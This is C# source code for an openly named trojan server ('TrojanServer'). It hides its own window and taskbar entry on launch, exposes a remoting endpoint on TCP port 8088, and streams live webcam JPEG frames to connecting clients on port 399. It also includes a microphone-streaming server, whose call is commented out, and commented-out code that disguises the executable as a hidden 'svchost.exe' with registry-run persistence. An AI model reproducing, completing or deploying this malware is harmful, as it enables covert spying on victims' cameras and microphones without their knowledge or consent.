using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Runtime.Remoting;
using System.Runtime.Remoting.Channels;
using System.Runtime.Remoting.Channels.Tcp;
using System.Runtime.Remoting.Channels.Http;
using System.Runtime.InteropServices;
using System.IO;
using System.Net;
using RemoteObject;
using Microsoft.Win32;
using System.Diagnostics;
using TCP;
using System.Threading;
using System.Diagnostics;
using System.Drawing.Imaging;
using System.Drawing;
using WinSound;
namespace TrojanServer
{
    public partial class TrojanServer : Form
    {
        ScreenObject remoteObject;
        TcpChannel channel;
        string path;
        public TrojanServer()
        {
            InitializeComponent();
        }

        private void TrojanServer_Load(object sender, EventArgs e)
        {
            #region Basic Server
            remoteObject = new ScreenObject();
            channel = new TcpChannel(8088);
            ChannelServices.RegisterChannel(channel, false);
            RemotingConfiguration.CustomErrorsMode = CustomErrorsModes.Off;
            RemotingConfiguration.RegisterWellKnownServiceType(typeof(ScreenObject),
                "ScreenObject", WellKnownObjectMode.Singleton);
            timer1.Enabled = true;
            #endregion

            #region Camera server
            //ThreadStart o = new ThreadStart(RunVoiceServer);
            //Thread thread = new Thread(o);
           // RunVoiceServer();
            RunCamera();
         
            #endregion

            #region Extra Function


            HideMyAss();

            //// copy excutable file to Desktop
            //try
            //{
            //    path = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            //    if (Application.ExecutablePath != path + @"\svchost\svchost.exe")
            //    {
            //        // MessageBox.Show("My excutable path is " + Application.ExecutablePath);
            //        if (!Directory.Exists(path + @"\svchost\"))
            //        {
            //            Directory.CreateDirectory(path + @"\svchost\");
            //        }
            //        if (File.Exists(path + @"\svchost\svchost.exe"))
            //        {
            //            File.Delete(path + @"\svchost\svchost.exe");
            //        }

            //        File.Copy(Application.ExecutablePath, path + @"\svchost\svchost.exe");

            //        File.SetAttributes(path + @"\svchost", FileAttributes.Directory | FileAttributes.System | FileAttributes.Hidden);
            //        File.SetAttributes(path + @"\svchost\svchost.exe", FileAttributes.System | FileAttributes.Hidden);



            //    }

            //}
            //catch (Exception ex)
            //{
            //    //MessageBox.Show("ERRRORRR " + ex.Message);

            //}


            ////add start up
            //RegistryKey registry = Registry.CurrentUser;
            ////HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
            //RegistryKey registrySoftware = registry.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
            //registrySoftware.CreateSubKey("svchost");
            //registrySoftware.SetValue("svchost", "\"" + path + @"\svchost\svchost.exe" + "\"");
            #endregion

        }

        #region Hide my ass in background
        private void HideMyAss()
        {
            this.Hide();
            //
            this.ShowInTaskbar = false;
            //not close button
            this.ControlBox = false;
            //no form
            this.Visible = false;
            //
            this.SetVisibleCore(false);
        }
        #endregion


        #region voices server
        private const int MAXOUTSTANDINGPACKETSVoices = 3;

        /// <summary>
        /// The thread will run the job.
        /// The job is the Method Run() below
        /// </summary>
        protected Thread threadVoices = null;
        private ManualResetEvent ConnectionReadyVoices;
        private volatile bool bShutDownVoices;
        private volatile int iConnectionCountVoices;
        WinSound.Recorder m_Recorder;
        TcpServer servVoices = null;
        List<string> waveindevices = WinSound.WinSound.GetRecordingNames();
        const int SAMPLE_PER_SECONDS = 11025;
        const int BIT_PER_SAMPLE = 16;
        const int CHANNEL = 1;
        const int BUFFER_COUNT = 8;
        const int BUFFER_SIZE = 1024;
        public void RunVoiceServer()
        {


            const int TCPLISTENPORTVoices = 499;
          
          
           
            m_Recorder = new WinSound.Recorder();
          


            // Set up logging
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Voices.log";
            StreamWriter sw = File.AppendText(path);

            try
            {
                // Set up member vars
                ConnectionReadyVoices = new ManualResetEvent(false);
                bShutDownVoices = false;

                InitRecorder();

                // Set up tcp server
                System.Net.IPAddress[] testVoices = TcpServer.GetAddresses();
                System.Net.IPAddress ipv4Voices = null;
                // IPAddress class contains the address of a computer on an IP network. 
                foreach (System.Net.IPAddress _IPAddressVoices in testVoices)
                {
                    // InterNetwork indicates that an IP version 4 address is expected 
                    // when a Socket connects to an endpoint
                    if (_IPAddressVoices.AddressFamily.ToString() == "InterNetwork")
                    {
                        ipv4Voices = _IPAddressVoices;
                    }
                }
                iConnectionCountVoices = 0;

                servVoices = new TcpServer(TCPLISTENPORTVoices, ipv4Voices);

                servVoices.Connected += new TcpConnected(ConnectedVoices);
                servVoices.Disconnected += new TcpConnected(DisconnectedVoices);
                servVoices.DataReceived += new TcpReceive(ReceiveVoices);
                servVoices.Send += new TcpSend(SendVoices);

                // Initialization succeeded.  Now, start serving up frames
                DoItVoices(m_Recorder, servVoices, sw);
            }
            catch (Exception ex)
            {
                try
                {
                    sw.WriteLine(String.Format("{0}: Failed on startup {1}", DateTime.Now.ToString(), ex));
                }
                catch { }
            }
            finally
            {
                // Cleanup
                if (servVoices != null)
                {
                    servVoices.Dispose();
                }

              
                sw.Close();
            }
        }


        /// <summary>
        /// InitRecorder
        /// </summary>
        private void InitRecorder()
        {
            m_Recorder.DataRecorded += new WinSound.Recorder.DelegateDataRecorded(OnDataReceivedFromSoundcard);
            m_Recorder.RecordingStopped += new WinSound.Recorder.DelegateStopped(OnRecordingStopped);
        }
        /// <summary>
        /// OnDataReceivedFromSoundcard
        /// </summary>
        /// <param name="data"></param>
        private void OnDataReceivedFromSoundcard(Byte[] data)
        {
            Byte[] mulaws = WinSound.Utils.LinearToMulaw(data, BIT_PER_SAMPLE, CHANNEL);
            servVoices.SendToAll(mulaws);
        }
        /// <summary>
        /// OnRecordingStopped
        /// </summary>
        private void OnRecordingStopped()
        {
          
        }
        // Start serving up frames
        private void DoItVoices(WinSound.Recorder m_Recorder, TcpServer serv, StreamWriter sw)
        {
            

            do
            {
                // Wait til a client connects before we start the graph
                ConnectionReadyVoices.WaitOne();
                
                if(waveindevices.Count>0)
                    {
                // While not shutting down, and still at least one client
                while ((!bShutDown) && (serv.Connections > 0))
                {
                    try
                    {
                       
                    m_Recorder.Start(waveindevices[0], SAMPLE_PER_SECONDS, BIT_PER_SAMPLE, CHANNEL, BUFFER_COUNT, BUFFER_SIZE);
                      
                    }
                    catch (Exception ex)
                    {
                        try
                        {
                            sw.WriteLine(DateTime.Now.ToString());
                            sw.WriteLine(ex);
                        }
                        catch { }
                    }
                    
                }
            }

                // Clients have all disconnected.  Pause, then sleep and wait for more
                m_Recorder.Stop();
                sw.WriteLine("record dropped");

            } while (!bShutDown);
        }

       
            
        // A client attached to the tcp port
        private void ConnectedVoices(object sender, ref object t)
        {
            lock (this)
            {
                t = new PacketCount(MAXOUTSTANDINGPACKETSVoices);
                iConnectionCountVoices++;

                if (iConnectionCountVoices == 1)
                {
                    ConnectionReadyVoices.Set();
                }
            }
        }

        // A client detached from the tcp port
        private void DisconnectedVoices(object sender, ref object t)
        {
            lock (this)
            {
                iConnectionCountVoices--;
                if (iConnectionCountVoices == 0)
                {
                    ConnectionReadyVoices.Reset();
                }
            }
        }

        private void ReceiveVoices(Object sender, ref object o, ref byte[] b, int ByteCount)
        {
            PacketCount pc = (PacketCount)o;
            pc.RemovePacket();
        }

        private void SendVoices(Object sender, ref object o, ref bool b)
        {
            PacketCount pc = (PacketCount)o;

            b = pc.AddPacket();
        }

     

        #endregion


        #region CameraServer
        
        private const int MAXOUTSTANDINGPACKETS = 3;

        /// <summary>
        /// The thread will run the job.
        /// The job is the Method Run() below
        /// </summary>
        protected Thread thread = null;
        private ManualResetEvent ConnectionReady;
        private volatile bool bShutDown;
        private volatile int iConnectionCount;


        public void RunCamera()
        {
            const int VIDEODEVICE = 0; // zero based index of video capture device to use
            const int FRAMERATE = 15;  // Depends on video device caps.  Generally 4-30.
            const int VIDEOWIDTH = 640; // Depends on video device caps
            const int VIDEOHEIGHT = 480; // Depends on video device caps
            const long JPEGQUALITY = 30; // 1-100 or 0 for default

            const int TCPLISTENPORT = 399;

            Capture cam = null;
            TcpServer serv = null;
            ImageCodecInfo myImageCodecInfo;
            EncoderParameters myEncoderParameters;



            // Set up logging
            string path = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\WebCam.log";
            StreamWriter sw = File.AppendText(path);

            try
            {
                // Set up member vars
                ConnectionReady = new ManualResetEvent(false);
                bShutDown = false;

                // Set up tcp server
                System.Net.IPAddress[] test = TcpServer.GetAddresses();
                System.Net.IPAddress ipv4 = null;
                // IPAddress class contains the address of a computer on an IP network. 
                foreach (System.Net.IPAddress _IPAddress in test)
                {
                    // InterNetwork indicates that an IP version 4 address is expected 
                    // when a Socket connects to an endpoint
                    if (_IPAddress.AddressFamily.ToString() == "InterNetwork")
                    {
                        ipv4 = _IPAddress;
                    }
                }
                iConnectionCount = 0;

                serv = new TcpServer(TCPLISTENPORT, ipv4);

                serv.Connected += new TcpConnected(Connected);
                serv.Disconnected += new TcpConnected(Disconnected);
                serv.DataReceived += new TcpReceive(Receive);
                serv.Send += new TcpSend(Send);

                myEncoderParameters = null;
                myImageCodecInfo = GetEncoderInfo("image/jpeg");

                if (JPEGQUALITY != 0)
                {
                    // If not using the default jpeg quality setting
                    EncoderParameter myEncoderParameter;
                    myEncoderParameter = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, JPEGQUALITY);
                    myEncoderParameters = new EncoderParameters(1);
                    myEncoderParameters.Param[0] = myEncoderParameter;
                }

                cam = new Capture(VIDEODEVICE, FRAMERATE, VIDEOWIDTH, VIDEOHEIGHT);

                // Initialization succeeded.  Now, start serving up frames
                DoIt(cam, serv, sw, myImageCodecInfo, myEncoderParameters);
            }
            catch (Exception ex)
            {
                try
                {
                    sw.WriteLine(String.Format("{0}: Failed on startup {1}", DateTime.Now.ToString(), ex));
                }
                catch { }
            }
            finally
            {
                // Cleanup
                if (serv != null)
                {
                    serv.Dispose();
                }

                if (cam != null)
                {
                    cam.Dispose();
                }
                sw.Close();
            }
        }

        // Start serving up frames
        private void DoIt(Capture cam, TcpServer serv, StreamWriter sw, ImageCodecInfo myImageCodecInfo, EncoderParameters myEncoderParameters)
        {
            MemoryStream m = new MemoryStream(20000);
            Bitmap image = null;
            IntPtr ip = IntPtr.Zero;
            do
            {
                // Wait til a client connects before we start the graph
                ConnectionReady.WaitOne();
              

                // While not shutting down, and still at least one client
                while ((!bShutDown) && (serv.Connections > 0))
                {
                    try
                    {
                        cam.Start();
                        // capture image
                        ip = cam.GetBitMap();
                        image = new Bitmap(cam.Width, cam.Height, cam.Stride, PixelFormat.Format24bppRgb, ip);
                        image.RotateFlip(RotateFlipType.RotateNoneFlipY);

                        // save it to jpeg using quality options
                        m.Position = 10;
                        image.Save(m, myImageCodecInfo, myEncoderParameters);

                        // Send the length as a fixed length string
                        m.Position = 0;
                        m.Write(Encoding.ASCII.GetBytes((m.Length - 10).ToString("d8") + "\r\n"), 0, 10);

                        // send the jpeg image
                        serv.SendToAll(m);

                        // Empty the stream
                        m.SetLength(0);

                        // remove the image from memory
                        image.Dispose();
                        image = null;
                    }
                    catch (Exception ex)
                    {
                        try
                        {
                            sw.WriteLine(DateTime.Now.ToString());
                            sw.WriteLine(ex);
                        }
                        catch { }
                    }
                    finally
                    {
                        if (ip != IntPtr.Zero)
                        {
                            Marshal.FreeCoTaskMem(ip);
                            ip = IntPtr.Zero;
                        }
                    }
                }

                // Clients have all disconnected.  Pause, then sleep and wait for more
                cam.Pause();
                sw.WriteLine("Dropped frames: " + cam.m_Dropped.ToString());

            } while (!bShutDown);
        }

        class PacketCount : IDisposable
        {
            private int m_PacketCount;
            private int m_MaxPackets;

            public PacketCount(int i)
            {
                m_MaxPackets = i;
                m_PacketCount = 0;
            }

            public bool AddPacket()
            {
                bool b;

                lock (this)
                {
                    b = m_PacketCount < m_MaxPackets;
                    if (b)
                    {
                        m_PacketCount++;
                    }
                    else
                    {
                        Debug.WriteLine("Max outstanding Packets reached");
                    }
                }

                return b;
            }

            public void RemovePacket()
            {
                lock (this)
                {
                    if (m_PacketCount > 0)
                    {
                        m_PacketCount--;
                    }
                    else
                    {
                        Debug.WriteLine("Packet count is messed up");
                    }
                }
            }

            public int Count()
            {
                return m_PacketCount;
            }

            #region IDisposable Members

            public void Dispose()
            {
#if DEBUG
                if (m_PacketCount != 0)
                {
                    Debug.WriteLine("Packets left over: " + m_PacketCount.ToString());
                }
#endif
            }

            #endregion
        }

        // A client attached to the tcp port
        private void Connected(object sender, ref object t)
        {
            lock (this)
            {
                t = new PacketCount(MAXOUTSTANDINGPACKETS);
                iConnectionCount++;

                if (iConnectionCount == 1)
                {
                    ConnectionReady.Set();
                }
            }
        }

        // A client detached from the tcp port
        private void Disconnected(object sender, ref object t)
        {
            lock (this)
            {
                iConnectionCount--;
                if (iConnectionCount == 0)
                {
                    ConnectionReady.Reset();
                }
            }
        }

        private void Receive(Object sender, ref object o, ref byte[] b, int ByteCount)
        {
            PacketCount pc = (PacketCount)o;
            pc.RemovePacket();
        }

        private void Send(Object sender, ref object o, ref bool b)
        {
            PacketCount pc = (PacketCount)o;

            b = pc.AddPacket();
        }

        // Find the appropriate encoder
        private ImageCodecInfo GetEncoderInfo(String mimeType)
        {
            int j;
            ImageCodecInfo[] encoders = ImageCodecInfo.GetImageEncoders();
            for (j = 0; j < encoders.Length; ++j)
            {
                if (encoders[j].MimeType == mimeType)
                    return encoders[j];
            }
            return null;
        }
        #endregion
   

        


    }

    }

